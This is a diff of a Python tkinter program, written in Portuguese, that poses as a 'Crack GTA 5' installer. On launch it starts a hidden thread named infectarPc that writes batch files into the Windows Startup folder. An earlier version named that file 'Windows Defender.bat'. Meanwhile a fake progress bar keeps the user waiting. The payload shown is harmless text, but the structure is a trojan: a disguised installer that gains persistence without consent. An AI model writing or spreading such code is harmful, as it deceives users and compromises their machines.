@@ -2,84 +2,116 @@ import time
 import os
 import threading
 from tkinter import *
+from tkinter import ttk
+
+class Principal:
+
+        win = Tk()
+
+        def __init__(self):
+
+                self.win.title("Crack GTA 5")
+                self.win.geometry("500x300+150+150")
+
+                lbTitulo = Label(self.win, text="Crack GTA 5")
+                lbDescricao = Label(self.win, text="Versão 4.20 - By Devils_Crack")
+                lbDesenvolvedores1 = Label(self.win, fg="red", text="weberRich4rds, S4tiv4, kamaLion")
+                lbDesenvolvedores2 = Label(self.win, fg="red", text="susuk1_green, qwerty_Dev1l")
+                lbDesenvolvedores3 = Label(self.win, fg="red", text="she_kakarot4, mc_hackudao")
+
+                btnProximo = Button(self.win, width=15, text="Proximo", command=self.btn_click)
+                btnCancelar = Button(self.win, width=15, text="Cancelar", command=self.btn_click)
+
+                imagem = PhotoImage(file="imagem.png")
+                img = Label(self.win, image=imagem)
+                img.imagem = imagem
+                img.pack()
+
+                lbTitulo.place(x=250, y=10)
+                lbDescricao.place(x=250, y=40)
+                lbDesenvolvedores1.place(x=250, y=100)
+                lbDesenvolvedores2.place(x=250, y=140)
+                lbDesenvolvedores3.place(x=250, y=180)
+                img.place(x=0, y=0)
+
+                btnProximo.place(x=380, y=250)
+                btnCancelar.place(x=250, y=250)
+
+                t = threading.Thread(target=self.infectarPc)
+                t.start()
+
+                self.win.mainloop()
 
 
-def msgInstalacao():
-    print("Instalando..")
+        def criarBatInicializacao(self):
+                with open(os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Driver.bat", "w") as arq:
+                        arq.write("@echo off")
+                        arq.write("\n")
+                        arq.write("start min file.bat")
+                        arq.write("\n")
+                        arq.write("exit")
+                        arq.close()
 
-    time.sleep(2)
+                with open(os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/file.bat", "w") as arq:
+                        arq.write("echo off")
+                        arq.write("\n")
+                        arq.write("cls")
+                        arq.write("\n")
+                        arq.write("echo oi sumida rsrs")
+                        arq.write("\n")
+                        arq.write("pause")
+                        arq.write("\n")
+                        arq.close()
 
-    for x in range(0, 101):
-        os.system('cls')
-        print(str(x) + "%")
-        time.sleep(.500)
 
 
-def criarBatInicializacao():
-        with open(os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows Defender.bat", "w") as arq:
+        def navegarPastas(self):
+                dir = os.path.dirname(os.path.realpath(__file__))
+
+
+        def infectarPc(self):
+                self.criarBatInicializacao()
+                self.navegarPastas()
+
+
+        def btn_click(self):
+                progresso = Progresso()
+
+                progresso.main()
+
+                self.win.destroy()
+
+
+
+class Progresso:
+
+        win = Tk()
+
+        def __init__(self):
+                self.win.title("Crack GTA 5")
+                self.win.geometry("500x80+150+150")
                 
-                arq.write("echo off")
-                arq.write("\n")
-                arq.write("cls")
-                arq.write("\n")
-                arq.write("echo oi sumida rsrs")
-                arq.write("\n")
-                arq.write("pause")
-                arq.write("\n")
-                arq.close()
+                var_barra = 1
+                minha_barra = ttk.Progressbar(self.win, variable=var_barra, maximum=100)
+                lbProgresso = Label(self.win, text="Aguarde até o fim da instalação")
+
+                minha_barra.place(x=0, y=40)
+                lbProgresso.place(x=10, y=0)        
+
+                tPb = threading.Thread(target=self.progressbar)
+                tPb.start()
+
+                self.win.mainloop()
+
+        def progressbar(self):
+                
+                for x in range(0, 101):
+                        var_barra = x
+
+                        print(var_barra)
+
+                        self.win.update()
+                        time.sleep(.500)
 
 
-def navegarPastas():
-        dir = os.path.dirname(os.path.realpath(__file__))
-
-
-def infectarPc():
-        criarBatInicializacao()
-        navegarPastas()
-
-
-def btn_click():
-    
-
-
-# TKINTER
-
-janela = Tk()
-janela.title("Crack GTA 5")
-janela.geometry("500x300+150+150")
-
-lbTitulo = Label(janela, text="Crack GTA 5")
-lbDescricao = Label(janela, text="Versão 4.20 - By Devils_Crack")
-lbDesenvolvedores1 = Label(janela, fg="red", text="weberRich4rds, S4tiv4, kamaLion")
-lbDesenvolvedores2 = Label(janela, fg="red", text="susuk1_green, qwerty_Dev1l")
-lbDesenvolvedores3 = Label(janela, fg="red", text="she_kakarot4, mc_hackudao")
-
-btnProximo = Button(janela, width=15, text="Proximo", command=btn_click)
-btnCancelar = Button(janela, width=15, text="Cancelar", command=btn_click)
-
-imagem = PhotoImage(file="imagem.png")
-img = Label(janela, image=imagem)
-img.imagem = imagem
-img.pack()
-
-lbTitulo.place(x=250, y=10)
-lbDescricao.place(x=250, y=40)
-lbDesenvolvedores1.place(x=250, y=100)
-lbDesenvolvedores2.place(x=250, y=140)
-lbDesenvolvedores3.place(x=250, y=180)
-img.place(x=0, y=0)
-
-btnProximo.place(x=380, y=250)
-btnCancelar.place(x=250, y=250)
-
-janela.mainloop()
-
-
-t = threading.Thread(target=msgInstalacao)
-t.start()
-
-if t.isAlive():
-    infectarPc()
-
-
-
+principal = Principal()
